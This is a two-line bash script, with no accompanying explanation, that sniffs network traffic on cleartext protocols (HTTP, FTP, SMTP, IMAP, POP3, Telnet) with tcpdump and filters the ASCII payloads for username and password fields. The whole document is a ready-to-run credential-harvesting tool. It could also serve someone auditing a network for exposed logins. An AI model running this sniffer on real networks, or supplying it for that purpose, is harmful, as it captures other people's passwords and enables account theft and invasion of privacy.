#!/bin/bash

tcpdump -n port http or port ftp or port smtp or port imap or port pop3 or port telnet -lA | egrep 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd= |password=|pass:|user:|user'
